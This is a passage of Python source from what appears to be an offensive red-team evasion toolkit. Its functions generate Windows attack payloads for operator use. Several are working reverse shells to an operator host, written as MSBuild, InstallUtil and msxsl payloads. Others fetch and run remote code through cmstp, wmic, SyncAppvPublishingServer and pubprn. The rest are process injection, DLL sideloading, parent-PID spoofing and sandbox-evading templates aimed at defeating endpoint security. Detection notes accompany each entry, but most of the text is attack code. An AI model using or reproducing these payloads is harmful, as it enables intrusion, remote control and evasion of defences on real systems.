        "Start-Sleep -Seconds 60  # placeholder; production implants use Timer Queue"
    )
    return EvasionResult(
        command=code,
        technique="sleep_obfuscation_ekko",
        notes=(
            "Sleep obfuscation defeats memory scanners that snapshot beacons "
            "during sleep intervals. Ekko uses Timer Queue + RC4 to encrypt the "
            "image and heap while sleeping. PowerShell can't reach the relevant "
            "Win32 APIs cleanly — operator builds a C/Rust implant that wraps "
            "every sleep call with this pattern."
        ),
        techniques=["T1027", "T1564"],
        risk="CRITICAL",
        detections=[
            "Frequent NtProtectVirtualMemory calls flipping image region to RW",
            "Timer Queue creation in non-msrpc process",
            "Memory entropy spikes during process sleep windows (EDR memory scanner)",
        ],
    )


# ── Process tradecraft ───────────────────────────────────────────────────────

def _ppid_spoof(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Spoof the parent PID of a child process so it appears to be spawned by
    explorer.exe (or any selected target) instead of powershell.exe. Defeats
    parent-child process detection rules.
    """
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "using System.Diagnostics;\n"
        "public static class PPID {\n"
        "    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFOEX {\n"
        "        public STARTUPINFO StartupInfo; public IntPtr lpAttributeList;\n"
        "    }\n"
        "    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO {\n"
        "        public uint cb; public IntPtr lpReserved, lpDesktop, lpTitle;\n"
        "        public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;\n"
        "        public ushort wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;\n"
        "    }\n"
        "    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION {\n"
        "        public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId;\n"
        "    }\n"
        "    [DllImport(\"kernel32\", SetLastError=true)] public static extern bool CreateProcess(\n"
        "        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,\n"
        "        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,\n"
        "        IntPtr lpEnvironment, string lpCurrentDirectory,\n"
        "        ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n"
        "    [DllImport(\"kernel32\")] public static extern bool InitializeProcThreadAttributeList(\n"
        "        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);\n"
        "    [DllImport(\"kernel32\")] public static extern bool UpdateProcThreadAttribute(\n"
        "        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,\n"
        "        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr OpenProcess(uint a, bool i, uint pid);\n"
        "}\n"
        "'@;\n"
        "$expPid=(Get-Process -Name explorer | Select-Object -First 1).Id;\n"
        "$pHandle=[PPID]::OpenProcess(0x000F0000, $false, $expPid);  # PROCESS_CREATE_PROCESS\n"
        "# operator: complete CreateProcess flow with EXTENDED_STARTUPINFO_PRESENT (0x00080000)\n"
        "# and PROC_THREAD_ATTRIBUTE_PARENT_PROCESS (0x00020000) populated with $pHandle.\n"
        "Write-Output ('parent handle: ' + $pHandle.ToString('X'))"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="ppid_spoof",
        notes=(
            "Parent PID spoofing — child appears spawned by explorer.exe. Defeats "
            "parent-child rules like 'winword.exe spawning powershell.exe'. EDRs "
            "that record token impersonation (Defender for Endpoint) may still "
            "flag because the access token comes from the calling process, not "
            "the spoofed parent."
        ),
        techniques=["T1134.004"],
        risk="HIGH",
        detections=[
            "Sysmon Event 1 — process parent PID mismatch with creator PID",
            "Microsoft-Windows-Kernel-Process/Analytic logs (when enabled)",
            "EDR rules on PROC_THREAD_ATTRIBUTE_PARENT_PROCESS usage",
        ],
    )


def _process_hollowing(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    source = f"""// Process hollowing template — C# stub. Operator compiles to .exe and runs.
// 1. CreateProcess(target.exe, CREATE_SUSPENDED) — typically notepad.exe / svchost.exe.
// 2. NtUnmapViewOfSection on the suspended process image base.
// 3. VirtualAllocEx(target, base, size, RW) and WriteProcessMemory(target, base, shellcode).
// 4. SetThreadContext to point RIP at AddressOfEntryPoint.
// 5. ResumeThread.
// Final process tree shows notepad.exe (the legit hollowed target).
//
// References: github.com/m0n0ph1/Process-Hollowing
// Production beacons embed this in their stager — supply shellcode generated
// from /generate?language=csharp&lhost={lhost}&lport={lport}.
//
// detections:
//   - SetThreadContext on remote thread to non-image RWX region
//   - Image base mismatch between process and its loaded module
//   - Sysmon Event 8 (CreateRemoteThread) — rare in normal usage
"""
    return EvasionResult(
        command=source,
        technique="process_hollowing",
        notes=(
            "Process hollowing template. Replace shellcode placeholder with bytes "
            f"from /generate?language=csharp&lhost={lhost}&lport={lport}. Modern "
            "EDRs (CrowdStrike, Defender for Endpoint) catch the classic 5-step "
            "flow — chain with ntdll_unhook + ppid_spoof for higher success."
        ),
        techniques=["T1055.012"],
        risk="CRITICAL",
        detections=[
            "Sysmon Event 8 (CreateRemoteThread) on freshly spawned target",
            "Memory scanner: image base region not backed by file mapping",
            "EDR rule on NtUnmapViewOfSection + WriteProcessMemory sequence",
        ],
    )


def _module_stomping(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    source = f"""// Module stomping template — C# stub.
// 1. LoadLibraryEx a benign signed DLL (e.g. amsi.dll or version.dll).
// 2. VirtualProtect its .text section to PAGE_EXECUTE_READWRITE.
// 3. Memcpy shellcode into the .text region.
// 4. VirtualProtect back to PAGE_EXECUTE_READ.
// 5. CreateThread with start address inside the stomped region.
// The process now has a thread executing from a legitimate signed image —
// EDR module-integrity scanners see a clean file hash but the loaded bytes differ.
//
// Operator pairs this with shellcode from /generate?language=csharp&lhost={lhost}&lport={lport}.
//
// detections:
//   - Image .text region content drift vs file hash (memory integrity scan)
//   - Thread start address inside loaded module but at unusual offset
//   - Sysmon Event 7 followed by unusual VirtualProtect to RWX
"""
    return EvasionResult(
        command=source,
        technique="module_stomping",
        notes=(
            f"Module stomping — overwrites .text of a benign signed DLL with "
            f"shellcode. Pair with shellcode from /generate?language=csharp&lhost={lhost}&lport={lport}. "
            "Strong against image-name-allowlist EDRs; weak against memory "
            "integrity scanners that compare in-memory .text against disk hash."
        ),
        techniques=["T1055.001"],
        risk="CRITICAL",
        detections=[
            "Memory integrity scan: .text content drift from on-disk hash",
            "Thread start address inside loaded module at non-export offset",
            "EDR ASR rule 'Block executable content from email/web' once decoded",
        ],
    )


def _thread_hijack(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    source = f"""// Suspended thread hijack template — classic Cobalt Strike technique.
// 1. CreateRemoteThread is loud — instead, SuspendThread on an existing thread.
// 2. GetThreadContext to capture RIP, RSP.
// 3. WriteProcessMemory shellcode to a VirtualAllocEx RX region.
// 4. SetThreadContext with RIP pointing at the shellcode.
// 5. ResumeThread.
// The hijacked thread inherits the parent process's identity/token.
//
// Target threads of choice: services.exe worker threads (long-lived), or any
// process thread we already have a handle to (no OpenThread needed).
//
// Combine with shellcode from /generate?language=csharp&lhost={lhost}&lport={lport}.
//
// detections:
//   - Sysmon Event 8 with start address in a non-image VirtualAlloc region
//   - SetThreadContext on remote thread (rare outside debuggers)
//   - CrowdStrike 'queue-user-apc to remote-thread' detection
"""
    return EvasionResult(
        command=source,
        technique="thread_hijack",
        notes=(
            f"Thread hijack template. Stealthier than CreateRemoteThread for "
            "in-process injection. Pair with shellcode from "
            f"/generate?language=csharp&lhost={lhost}&lport={lport}. EDRs that "
            "monitor SetThreadContext on cross-process threads will flag it."
        ),
        techniques=["T1055.003"],
        risk="CRITICAL",
        detections=[
            "Sysmon Event 8 with non-image start address",
            "SetThreadContext on remote process thread",
            "Suspended thread with RIP modified outside its image bounds",
        ],
    )


# ── More LOLBAS ───────────────────────────────────────────────────────────────

def _lolbas_msbuild(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    xml = f"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
             AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
<![CDATA[
using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
public class ClassExample : Task {{
  public override bool Execute() {{
    var c = new TcpClient("{lhost}", {lport});
    var s = c.GetStream();
    var p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.RedirectStandardInput = true;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    byte[] buf = new byte[1024]; int n;
    while ((n = s.Read(buf, 0, buf.Length)) > 0) {{
      string cmd = System.Text.Encoding.ASCII.GetString(buf, 0, n);
      p.StandardInput.WriteLine(cmd);
    }}
    return true;
  }}
}}
]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"""
    return EvasionResult(
        command=(
            f"# Save the XML below as %TEMP%\\payload.xml then run:\n"
            f"# C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\MSBuild.exe %TEMP%\\payload.xml\n"
            f"\n{xml}"
        ),
        technique="lolbas_msbuild",
        notes=(
            f"MSBuild inline-task — runs arbitrary C# code as msbuild.exe. "
            f"No PowerShell, no compiled .exe, no AMSI. Reverse shell to {lhost}:{lport}. "
            "Defender blocks via ASR 'Block process creations originating from PSExec/WMI'."
        ),
        techniques=["T1127.001"],
        risk="CRITICAL",
        detections=[
            "msbuild.exe spawning cmd.exe/powershell.exe (Sysmon Event 1)",
            "Defender ASR rule 'Block executable files from running unless they meet a prevalence, age, or trusted list criterion'",
            "MSBuild compiling C# task at runtime — Microsoft-Windows-DotNETRuntime ETW",
        ],
    )


def _lolbas_installutil(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    # The C# source uses InstallUtil's /U (uninstall) flag which invokes the
    # Uninstall override before any signing/auth check. The text is built as a
    # plain string (no f-string) to avoid PEP-498 brace-escaping noise on the
    # generic types used by .NET's Process API.
    src = (
        "// uninstaller.cs — operator compiles then triggers via:\n"
        "// csc.exe /platform:x64 /target:library /out:%TEMP%\\u.dll uninstaller.cs\n"
        "// C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\\u.dll\n"
        "using System;\n"
        "using System.ComponentModel;\n"
        "using System.Configuration.Install;\n"
        "using System.Net.Sockets;\n"
        "using System.Diagnostics;\n"
        "\n"
        "[RunInstaller(true)]\n"
        "public class Sample : Installer {\n"
        "    public override void Uninstall(System.Collections.IDictionary s) {\n"
        f"        var c = new TcpClient(\"{lhost}\", {lport});\n"
        "        var st = c.GetStream();\n"
        "        var p = new Process();\n"
        "        p.StartInfo.FileName = \"cmd.exe\";\n"
        "        p.StartInfo.RedirectStandardInput = true;\n"
        "        p.StartInfo.RedirectStandardOutput = true;\n"
        "        p.StartInfo.UseShellExecute = false;\n"
        "        p.Start();\n"
        "        byte[] buf = new byte[1024]; int n;\n"
        "        while ((n = st.Read(buf, 0, buf.Length)) > 0) {\n"
        "            string cmd = System.Text.Encoding.ASCII.GetString(buf, 0, n);\n"
        "            p.StandardInput.WriteLine(cmd);\n"
        "        }\n"
        "    }\n"
        "}\n"
    )
    return EvasionResult(
        command=src,
        technique="lolbas_installutil",
        notes=(
            f"InstallUtil.exe /U triggers the Uninstall override of a signed "
            f"installer DLL — runs C# under installutil.exe (.NET trusted). "
            f"Reverse shell to {lhost}:{lport}. Detection: installutil.exe spawning cmd.exe."
        ),
        techniques=["T1218.004"],
        risk="HIGH",
        detections=[
            "installutil.exe spawning cmd.exe / cmd /c (Sysmon Event 1)",
            "Sysmon Event 7: installutil.exe loading non-Microsoft DLL",
            "Microsoft-Windows-DotNETRuntime ETW: assembly load from %TEMP%",
        ],
    )


def _lolbas_cmstp(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    inf = (
        "[version]\n"
        "Signature=$chicago$\n"
        "AdvancedINF=2.5\n"
        "\n"
        "[DefaultInstall_SingleUser]\n"
        "UnRegisterOCXs=UnRegisterOCXSection\n"
        "\n"
        "[UnRegisterOCXSection]\n"
        f"%11%\\scrobj.dll,NI,http://{lhost}:{lport}/payload.sct\n"
        "\n"
        "[Strings]\n"
        "AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\"\n"
        "ServiceName=\"PayloadCM\"\n"
        "ShortSvcName=\"Payload\"\n"
    )
    return EvasionResult(
        command=(
            "# Save below as %TEMP%\\payload.inf then run:\n"
            "# cmstp.exe /au %TEMP%\\payload.inf\n\n" + inf
        ),
        technique="lolbas_cmstp",
        notes=(
            f"cmstp.exe + INF file triggers remote .sct scriptlet over HTTP. "
            f"Host the SCT at http://{lhost}:{lport}/payload.sct. Bypasses many "
            "default UAC settings (cmstp is auto-elevated for some INF profiles)."
        ),
        techniques=["T1218.003"],
        risk="HIGH",
        detections=[
            "cmstp.exe with INF path argument in command line (Sysmon Event 1)",
            "cmstp.exe initiating outbound HTTP to non-Microsoft host",
            "scrobj.dll loaded by cmstp.exe (Sysmon Event 7)",
        ],
    )


def _lolbas_msxsl(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    xsl = (
        '<?xml version="1.0"?>\n'
        '<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" \n'
        '            xmlns:user="placeholder" version="1.0">\n'
        '  <output method="text"/>\n'
        '  <ms:script implements-prefix="user" language="JScript">\n'
        '    <![CDATA[\n'
        '    var r = new ActiveXObject("WScript.Shell").Run(\n'
        f'      "cmd /c powershell -NoP -W Hidden -Exec Bypass -c \\"$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});'
        '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'
        'while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        '(iex $d 2>&1|Out-String)|%{[text.encoding]::ASCII.GetBytes($_)}|'
        '%{$s.Write($_,0,$_.Length);$s.Flush()}};$c.Close()\\"",\n'
        '      0, false);\n'
        '    ]]>\n'
        '  </ms:script>\n'
        '</stylesheet>\n'
    )
    return EvasionResult(
        command=(
            "# Save as payload.xsl, host alongside any XML file. Then on target:\n"
            "# msxsl.exe http://attacker/dummy.xml http://attacker/payload.xsl\n"
            "# (Requires msxsl.exe — operator must drop the binary first; not on Win10+ by default.)\n\n"
            + xsl
        ),
        technique="lolbas_msxsl",
        notes=(
            f"msxsl.exe executes embedded JScript via XSL transform. "
            f"Hosts JScript that spawns a PS reverse shell to {lhost}:{lport}. "
            "msxsl.exe is Microsoft-signed but not present by default — operator "
            "stages it via certutil first."
        ),
        techniques=["T1220"],
        risk="HIGH",
        detections=[
            "msxsl.exe execution — uncommon on default Windows 10+ installs",
            "msxsl.exe spawning powershell.exe / cmd.exe (high-fidelity)",
            "JScript execution via XSL ms:script (Microsoft-Windows-XPS-Spooler / IE log)",
        ],
    )


def _lolbas_wmic_xsl(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    return EvasionResult(
        command=(
            f"# Host an XSL stylesheet at http://{lhost}:{lport}/payload.xsl that uses\n"
            f"# ms:script JScript to spawn cmd. Then on target:\n"
            f"wmic.exe os get /format:\"http://{lhost}:{lport}/payload.xsl\""
        ),
        technique="lolbas_wmic_xsl",
        notes=(
            f"wmic.exe /format: with a remote XSL URL loads and executes embedded "
            f"JScript. Reverse shell host: {lhost}:{lport}. Most EDRs flag this — "
            "wmic.exe outbound to non-corporate host is rare."
        ),
        techniques=["T1220", "T1047"],
        risk="HIGH",
        detections=[
            "wmic.exe with /format: pointing to HTTP URL (high-fidelity)",
            "wmic.exe spawning powershell.exe or cmd.exe (Sysmon Event 1)",
            "Outbound HTTP from wmic.exe (very unusual)",
        ],
    )


def _lolbas_syncappv(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    return EvasionResult(
        command=(
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -C "
            f"\"$a='Sync'+'AppvPublishingServer';"
            f"&($a) 'n;(New-Object Net.WebClient).DownloadString(\\\"http://{lhost}:{lport}/payload.ps1\\\")|iex'\""
        ),
        technique="lolbas_syncappv",
        notes=(
            f"SyncAppvPublishingServer cmdlet executes argument injected via 'n;'. "
            f"Bypasses AppLocker / WDAC PowerShell signing for the injected payload. "
            f"Hosts payload at http://{lhost}:{lport}/payload.ps1."
        ),
        techniques=["T1218.013"],
        risk="HIGH",
        detections=[
            "SyncAppvPublishingServer.vbs / .exe usage outside App-V context",
            "PowerShell ScriptBlock log entry with SyncAppvPublishingServer string",
            "Outbound HTTP from PowerShell.exe to non-corporate host",
        ],
    )


def _lolbas_pubprn(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    return EvasionResult(
        command=(
            f"# Host a JScript scriptlet at http://{lhost}:{lport}/payload.sct that spawns the payload.\n"
            f"cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs "
            f"localhost \"script:http://{lhost}:{lport}/payload.sct\""
        ),
        technique="lolbas_pubprn",
        notes=(
            f"pubprn.vbs accepts a 'script:' URL as the second argument and "
            f"instantiates the remote scriptlet. Effective against AppLocker "
            f"script policies that allow cscript.exe + signed Microsoft scripts. "
            f"Stage SCT at http://{lhost}:{lport}/payload.sct."
        ),
        techniques=["T1216", "T1218"],
        risk="HIGH",
        detections=[
            "cscript.exe / wscript.exe with pubprn.vbs argument (high-fidelity)",
            "scrobj.dll loaded by cscript.exe (Sysmon Event 7)",
            "Outbound HTTP for .sct file from cscript.exe",
        ],
    )


# ── Elite tradecraft (v4.3) ───────────────────────────────────────────────────

def _rop_sleep(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// ROP-chain sleep mask. Defeats memory scanners that snapshot beacons\n"
        "// during sleep intervals AND callstack-based detections (Ekko's WaitFor\n"
        "// is itself a tell). Builds a chain that calls VirtualProtect → SystemFunction032\n"
        "// (RC4) → WaitForSingleObject → SystemFunction032 (decrypt) → VirtualProtect → NtContinue.\n"
        "// The thread context is preserved across the sleep — no callstack artifact.\n"
        "//\n"
        "// References: https://github.com/Cracked5pider/Ekko (Ekko)\n"
        "//             https://github.com/SaadAhla/RtlpSleepWithROP (RtlpSleepWithROP)\n"
        "//\n"
        "// Operator embeds in beacon. Pseudo-code C:\n"
        "//   CONTEXT ctx; GetThreadContext(self, &ctx);\n"
        "//   build_rop_chain(&ctx, sleep_ms);\n"
        "//   NtContinue(&ctx, FALSE);    // returns to the chain start with new RIP/RSP\n"
        "// The chain executes the encrypt → wait → decrypt cycle then NtContinue's\n"
        "// back into the beacon proper.\n"
    )
    return EvasionResult(
        command=src,
        technique="rop_sleep",
        notes=(
            "ROP-chain sleep mask. Stronger than Ekko because the callstack during "
            "sleep contains only legitimate ntdll/kernel32 frames. Embeds in the "
            "implant — operator builds with the rest of the beacon."
        ),
        techniques=["T1027", "T1620"],
        risk="CRITICAL",
        detections=[
            "Kernel ETW Threat-Intel events: NtContinue from non-image return address",
            "Stack pivot detection (RSP suddenly outside thread stack range)",
            "VirtualProtect on image region followed by RC4-pattern memory writes",
        ],
    )


def _set_windows_hook_loader(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    src = (
        "// SetWindowsHookEx DLL injection. Loads a payload DLL into every GUI thread\n"
        "// of a specified process by registering a global hook. Powerful, quiet, and\n"
        "// available since Windows 3.0 — many EDRs still trip over it.\n"
        "//\n"
        "// 1. Compile a DLL with DllMain that fires the implant on DLL_PROCESS_ATTACH.\n"
        "// 2. Drop the DLL to disk (or stage in memory via ManualMap).\n"
        "// 3. Call LoadLibrary on the local process to obtain the proc address.\n"
        "// 4. SetWindowsHookEx(WH_GETMESSAGE, hookProc, hMod, threadId)\n"
        "//    - threadId=0 hooks every GUI thread in every process.\n"
        "//    - threadId=<remote> targets one process via its main thread ID.\n"
        "// 5. Generate any window message in the target process (e.g. PostThreadMessage)\n"
        "//    to force OS to map the DLL.\n"
        "//\n"
        "// Pair with shellcode/DLL built from /generate?language=csharp.\n"
        f"// Listener: {lhost}:{lport}\n"
        "//\n"
        "// detections:\n"
        "//   - Sysmon Event 7 — DLL loaded into a process with no other connection\n"
        "//   - SetWindowsHookEx with WH_GETMESSAGE from non-msrpc process\n"
        "//   - DLL loaded from non-system path into svchost.exe / explorer.exe\n"
    )
    return EvasionResult(
        command=src,
        technique="set_windows_hook_loader",
        notes=(
            f"SetWindowsHookEx-based DLL injection. Stealthy because the DLL load "
            f"happens via the standard message dispatch path — no CreateRemoteThread "
            f"or QueueUserAPC artifact. Listener: {lhost}:{lport}."
        ),
        techniques=["T1055.001"],
        risk="HIGH",
        detections=[
            "DLL load from non-system path into GUI process (Sysmon Event 7)",
            "SetWindowsHookEx call followed by PostThreadMessage to target TID",
            "Defender ASR 'Block executable files from running unless they meet a prevalence' on loaded DLL",
        ],
    )


def _com_rot_injection(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "# COM Running Object Table abuse — registers a malicious COM object that\n"
        "# legitimate apps will instantiate on next call. Subtle persistence + lateral\n"
        "# code-execution in one move.\n"
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class RotInject {\n"
        "    [DllImport(\"ole32\")] public static extern int GetRunningObjectTable(int reserved, out IntPtr prot);\n"
        "    [DllImport(\"ole32\")] public static extern int CreateItemMoniker(string lpszDelim, string lpszItem, out IntPtr ppmk);\n"
        "    [DllImport(\"ole32\")] public static extern int CoInitialize(IntPtr p);\n"
        "    // ROT entry registers a name → IUnknown* mapping.\n"
        "    // Legit apps (Office automation, AutoCAD) call GetObject(\"namedItem\") and\n"
        "    // receive our IUnknown — our COM server's QueryInterface runs first.\n"
        "}\n"
        "'@;\n"
        "Write-Output 'COM ROT injection: operator implements IClassFactory and registers entry'"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="com_rot_injection",
        notes=(
            "COM Running Object Table injection. Used by legitimate apps for IPC; "
            "operator registers a moniker name commonly checked by automation "
            "consumers (Outlook, Word, Excel). Defeats EDRs that don't audit ROT "
            "registrations. Requires per-user COM init."
        ),
        techniques=["T1559.001", "T1546"],
        risk="HIGH",
        detections=[
            "ole32!RegisterActiveObject from non-Office user-mode process",
            "Sysmon Event 7: ole32.dll loaded in PowerShell with no Office context",
            "ETW: COM activation events with unusual CLSID",
        ],
    )


def _environment_keying(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Management;\n"
        "using System.Security.Cryptography;\n"
        "using System.Text;\n"
        "public static class EnvKey {\n"
        "    // Derive a 32-byte key from machine-bound facts. Sample at engagement\n"
        "    // start, hash, and embed in the payload. The payload only decrypts when\n"
        "    // re-derivation on the target matches.\n"
        "    public static byte[] Derive() {\n"
        "        var sb = new StringBuilder();\n"
        "        foreach (ManagementObject m in new ManagementObjectSearcher(\"SELECT * FROM Win32_BIOS\").Get())\n"
        "            sb.Append(m[\"SerialNumber\"]?.ToString() ?? \"\");\n"
        "        foreach (ManagementObject m in new ManagementObjectSearcher(\"SELECT * FROM Win32_ComputerSystem\").Get())\n"
        "            sb.Append(m[\"Manufacturer\"]?.ToString() ?? \"\").Append(m[\"Model\"]?.ToString() ?? \"\");\n"
        "        sb.Append(Environment.UserDomainName);\n"
        "        using (var sha = SHA256.Create()) {\n"
        "            return sha.ComputeHash(Encoding.UTF8.GetBytes(sb.ToString()));\n"
        "        }\n"
        "    }\n"
        "}\n"
        "'@;\n"
        "$k = [EnvKey]::Derive();\n"
        "$hex = [BitConverter]::ToString($k).Replace('-', '').ToLower();\n"
        "Write-Output \"derived key (sample at engagement start): $hex\"\n"
        "# Operator: at engagement start, run once and copy $hex into the payload.\n"
        "# At runtime, payload re-derives and uses as AES key to decrypt the\n"
        "# embedded shellcode. Wrong host = wrong key = decrypt produces garbage."
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="environment_keying",
        notes=(
            "Environment-keyed payload. Decryption key is derived from machine-bound "
            "facts (BIOS serial + manufacturer/model + user domain). Sandboxes get a "
            "different key → ciphertext decrypts to garbage → analysis tools see only "
            "noise. Defeats automated sandbox detonation."
        ),
        techniques=["T1027.013", "T1480.001"],
        risk="CRITICAL",
        detections=[
            "Win32_BIOS + Win32_ComputerSystem WMI queries followed by SHA-256 + AES",
            "Process probing BIOS serial on first execution",
            "Embedded AES-encrypted blob that fails to decrypt outside target",
        ],
    )


def _in_memory_pe_loader(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// Reflective in-memory PE loader stub — C#. Operator embeds a base64'd\n"
        "// .NET assembly or native PE in the loader source; the loader maps it\n"
        "// into memory and invokes its entry point — no disk artifact, no\n"
        "// LoadLibrary fingerprint.\n"
        "//\n"
        "// .NET path (easy): Assembly.Load(byte[]) → invoke EntryPoint.\n"
        "//   var asm = Assembly.Load(Convert.FromBase64String(B64));\n"
        "//   asm.EntryPoint.Invoke(null, new object[] { new string[]{} });\n"
        "//\n"
        "// Native path (harder, stealthier):\n"
        "//   1. VirtualAlloc(NULL, sizeOfImage, MEM_COMMIT, PAGE_READWRITE)\n"
        "//   2. Memcpy headers; for each section memcpy into image.\n"
        "//   3. Walk relocation table; apply deltas.\n"
        "//   4. Walk import table; LoadLibrary + GetProcAddress; patch IAT.\n"
        "//   5. VirtualProtect per-section based on Characteristics.\n"
        "//   6. Call entrypoint at base + AddressOfEntryPoint.\n"
        "//\n"
        "// References: stephenfewer/ReflectiveDLLInjection (canonical),\n"
        "//             monoxgas/sRDI (single-file).\n"
        "//\n"
        "// detections:\n"
        "//   - Assembly.Load(byte[]) — Microsoft-Windows-DotNETRuntime / AMSI 2nd-stage\n"
        "//   - Manual mapping: image-region in memory with no corresponding LdrData entry\n"
        "//   - VirtualProtect flip from RW to RX without prior VirtualAlloc EXEC\n"
    )
    return EvasionResult(
        command=src,
        technique="in_memory_pe_loader",
        notes=(
            "Reflective PE loader. .NET path is the one-liner; native path is "
            "stealthier but verbose. Operator embeds Assembly.Load(b64) inside any "
            "evasion chain. For native PEs use stephenfewer/ReflectiveDLLInjection."
        ),
        techniques=["T1620"],
        risk="CRITICAL",
        detections=[
            "Assembly.Load(byte[]) call from non-Microsoft assembly",
            "Manual map detection — image region without LdrData entry",
            "AMSI 2nd-stage scan of decoded .NET assembly bytes",
        ],
    )


def _dll_sideload(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    src = (
        "// DLL sideloading — abuse a legitimate signed executable that loads a\n"
        "// satellite DLL by relative path. Drop your malicious DLL beside it. The\n"
        "// EXE's signed image hash is unchanged, but YOUR DLL runs in its context.\n"
        "//\n"
        "// Operator's flow:\n"
        "// 1. Pick a target binary. Common ones with known sideload vectors:\n"
        "//    - OneDrive.exe → loads version.dll relative\n"
        "//    - dbghelp.exe → loads dbgcore.dll relative\n"
        "//    - python.exe → loads python3.dll relative\n"
        "//    - signed AV/EDR uninstallers — sometimes load mscoree.dll relative\n"
        "//    Full list: hijacklibs.net\n"
        "// 2. Build a proxy DLL with the same export table as the real version.dll.\n"
        "//    Every exported function calls through to the real DLL EXCEPT one of\n"
        "//    them which runs your payload first.\n"
        "// 3. Drop both your proxy DLL and the signed EXE into %APPDATA%\\<vendor>\\.\n"
        "//    Execute the EXE.\n"
        "//\n"
        "// Proxy DLL skeleton (compile with /export forwarding for the boring ones):\n"
        "//   #pragma comment(linker, \"/export:GetFileVersionInfoA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoA,@1\")\n"
        "//   #pragma comment(linker, \"/export:GetFileVersionInfoSizeA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoSizeA,@2\")\n"
        "//   // ... rest of exports ...\n"
        "//   BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) {\n"
        "//       if (r == DLL_PROCESS_ATTACH) {\n"
        "//           // Connect back to attacker:\n"
        f"//           //   {lhost}:{lport}\n"
        "//           CreateThread(NULL, 0, RunBeacon, NULL, 0, NULL);\n"
        "//       }\n"
        "//       return TRUE;\n"
        "//   }\n"
        "//\n"
        "// detections:\n"
        "//   - Signed binary loading DLL from %APPDATA% (Sysmon Event 7)\n"
        "//   - DLL with manifest mismatch vs catalog-signed copy\n"
        "//   - hijacklibs.net intel feeds in modern EDRs\n"
    )
    return EvasionResult(
        command=src,
        technique="dll_sideload",
        notes=(
            f"DLL sideloading template. Pair a signed legitimate EXE with your "
            f"proxy DLL. Listener: {lhost}:{lport}. Most operators target Citrix, "
            "Adobe, or vendor agents — hijacklibs.net has the full catalog."
        ),
        techniques=["T1574.002"],
        risk="HIGH",
        detections=[
            "Signed binary loading DLL from %APPDATA% or %TEMP% (Sysmon Event 7)",
            "Image-load anomaly: DLL filename matches system DLL but loaded from non-system path",
            "Defender ASR 'Block credential stealing from the Windows local security authority subsystem' (LSASS-adjacent)",
        ],
